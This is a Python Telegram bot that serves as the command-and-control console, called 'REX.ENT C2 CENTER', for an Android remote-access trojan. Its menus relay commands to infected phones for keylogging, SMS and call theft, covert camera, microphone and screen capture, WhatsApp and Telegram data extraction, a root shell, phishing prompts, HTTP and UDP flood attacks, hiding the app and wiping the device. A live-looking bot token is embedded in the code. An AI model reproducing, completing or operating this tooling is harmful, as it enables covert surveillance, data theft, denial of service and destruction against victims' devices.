import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = "8739367697:AAELUfIpX0mU3rcokQQiAywGYMhvpj2ickg"
ADMIN_CHAT_ID = 8601209747

# Format: /command SESSION_ID [args]
# Contoh: /info SESSION_ABC123
# Gunakan ALL untuk semua perangkat: /info ALL

MAIN_MENU = [
    [InlineKeyboardButton("📁 File Manager", callback_data="tab_file")],
    [InlineKeyboardButton("📍 Location", callback_data="tab_loc"), InlineKeyboardButton("💬 SMS/Calls", callback_data="tab_sms")],
    [InlineKeyboardButton("📷 Camera", callback_data="tab_cam"), InlineKeyboardButton("🎙 Audio", callback_data="tab_aud")],
    [InlineKeyboardButton("🖥 Screen", callback_data="tab_scr"), InlineKeyboardButton("⌨ Keylogger", callback_data="tab_key")],
    [InlineKeyboardButton("📱 Device Info", callback_data="tab_dev"), InlineKeyboardButton("📋 Clipboard", callback_data="tab_clip")],
    [InlineKeyboardButton("🔔 Notifications", callback_data="tab_notif"), InlineKeyboardButton("📦 Stealer", callback_data="tab_steal")],
    [InlineKeyboardButton("🌐 Network / DoS", callback_data="tab_net"), InlineKeyboardButton("⚙ Shell", callback_data="tab_shell")],
    [InlineKeyboardButton("🛡 System", callback_data="tab_sys"), InlineKeyboardButton("💣 Destroy", callback_data="tab_destroy")],
    [InlineKeyboardButton("🆔 Set Active Session", callback_data="set_session")],
]

# Session target yang akan ditambahkan di setiap perintah (default ALL)
active_session = "ALL"

SESSION_MENU = [
    [InlineKeyboardButton("ALL (all devices)", callback_data="sess_ALL")],
    [InlineKeyboardButton("SESSION_XXXX (input manual)", callback_data="sess_manual")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
]

TAB_COMMANDS = {
    "tab_file": ["/ls [SESSION] /sdcard", "/download [SESSION] /sdcard/Download/file.txt", "/rm [SESSION] /sdcard/file.txt", "/rename [SESSION] /old /new"],
    "tab_loc": ["/location [SESSION]", "/gps [SESSION]"],
    "tab_sms": ["/sms_list [SESSION] 20", "/sendsms [SESSION] 0812xxxx 'Hello'", "/delsms [SESSION] 1", "/calls [SESSION] 30", "/contacts [SESSION]"],
    "tab_cam": ["/photo_front [SESSION]", "/photo_back [SESSION]", "/record [SESSION] 15"],
    "tab_aud": ["/mic [SESSION] 30", "/liveaudio [SESSION]"],
    "tab_scr": ["/screenshot [SESSION]", "/screenrecord [SESSION] 30"],
    "tab_key": ["/keylog_start [SESSION]", "/keylog_dump [SESSION]", "/keylog_stop [SESSION]"],
    "tab_dev": ["/info [SESSION]", "/apps [SESSION]", "/battery [SESSION]", "/network [SESSION]", "/permissions [SESSION]"],
    "tab_clip": ["/clipboard [SESSION]", "/setclip [SESSION] HelloWorld"],
    "tab_notif": ["/notif [SESSION]", "/fakenotif [SESSION] Test Hello"],
    "tab_steal": ["/steal_images [SESSION]", "/steal_docs [SESSION]", "/extract_wa [SESSION]", "/extract_tg [SESSION]"],
    "tab_net": ["/httpflood [SESSION] http://target.com 50", "/udpflood [SESSION] 1.2.3.4 53 30"],
    "tab_shell": ["/shell [SESSION] ls -la", "/sush [SESSION] id"],
    "tab_sys": ["/openurl [SESSION] https://google.com", "/toast [SESSION] hacked", "/phish [SESSION] Google Verify", "/vibrate [SESSION] 2000", "/playsound [SESSION]", "/lock [SESSION]", "/hideicon [SESSION]", "/autostart [SESSION]"],
    "tab_destroy": ["/wipe [SESSION]", "/destroy [SESSION]"],
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    await update.message.reply_text(
        "🔰 <b>REX.ENT C2 CENTER</b>\n"
        f"<b>Active Session Target:</b> <code>{active_session}</code>\n\n"
        "Select tab to see commands. Commands will include session target.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(MAIN_MENU)
    )

async def tab_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "set_session":
        await query.edit_message_text(
            f"<b>Select target session:</b> (Current: <code>{active_session}</code>)\n"
            "Send manually: type <code>/session SESSION_ID</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(SESSION_MENU)
        )
        return

    if data.startswith("sess_"):
        global active_session
        if data == "sess_ALL":
            active_session = "ALL"
        elif data == "sess_manual":
            await query.edit_message_text(
                "Type the session ID (case-insensitive) after <code>/session</code>:\n"
                "<code>/session SESSION_12345</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(MAIN_MENU)
            )
            return
        await query.edit_message_text(
            f"✅ Active target set to: <code>{active_session}</code>\nSelect a tab to see commands.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(MAIN_MENU)
        )
        return

    if data == "back_main":
        await query.edit_message_text(
            "Select a command tab:",
            reply_markup=InlineKeyboardMarkup(MAIN_MENU)
        )
        return

    if data in TAB_COMMANDS:
        commands = TAB_COMMANDS[data]
        # Replace [SESSION] with active_session
        rendered = [c.replace("[SESSION]", active_session) for c in commands]
        txt = f"📌 <b>{data.replace('tab_','').upper()}</b> (Target: <code>{active_session}</code>)\n\n"
        txt += "\n".join(f"<code>{c}</code>" for c in rendered)
        await query.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(MAIN_MENU))

async def set_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    global active_session
    msg = update.message.text.strip()
    parts = msg.split()
    if len(parts) >= 2:
        active_session = parts[1].upper()
        await update.message.reply_text(f"✅ Active session set to <code>{active_session}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("Usage: <code>/session SESSION_ID</code>", parse_mode=ParseMode.HTML)

async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    cmd = update.message.text.strip()
    logger.info(f"Relaying: {cmd}")

    # If user sends a command without session target, inject the active_session
    parts = cmd.split()
    if parts[0].startswith("/"):
        cmd_name = parts[0].lower()
        # List commands that need target
        need_target = ["/ls","/download","/rm","/rename","/sms_list","/sendsms","/delsms",
                       "/calls","/contacts","/location","/gps","/photo_front","/photo_back",
                       "/record","/mic","/liveaudio","/screenshot","/screenrecord",
                       "/keylog_start","/keylog_stop","/keylog_dump","/info","/apps",
                       "/battery","/network","/permissions","/clipboard","/setclip",
                       "/notif","/fakenotif","/steal_images","/steal_docs","/extract_wa",
                       "/extract_tg","/httpflood","/udpflood","/shell","/sush","/openurl",
                       "/toast","/phish","/vibrate","/playsound","/lock","/wipe","/destroy",
                       "/hideicon","/autostart","/socmed"]
        if cmd_name in need_target:
            # Check if second argument is a session-like pattern
            if len(parts) < 2 or not (parts[1].startswith("SESSION_") or parts[1].upper() == "ALL"):
                # Insert active_session
                parts.insert(1, active_session)
                cmd = " ".join(parts)
                logger.info(f"Auto-inserted session: {cmd}")

    await update.message.reply_text(f"📤 <b>Sent:</b> <code>{cmd}</code>\n<i>Awaiting device...</i>", parse_mode=ParseMode.HTML)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(tab_handler))
    app.add_handler(CommandHandler("session", set_session_cmd))
    app.add_handler(CommandHandler(["info","ls","download","rm","rename","sms_list","sendsms","delsms","calls","contacts","location","gps","photo_front","photo_back","record","mic","liveaudio","screenshot","screenrecord","keylog_start","keylog_stop","keylog_dump","apps","battery","network","permissions","clipboard","setclip","notif","fakenotif","steal_images","steal_docs","extract_wa","extract_tg","httpflood","udpflood","shell","sush","openurl","toast","phish","vibrate","playsound","lock","wipe","destroy","hideicon","autostart","socmed"], relay))
    logger.info("C2 Bot multi-session ready")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
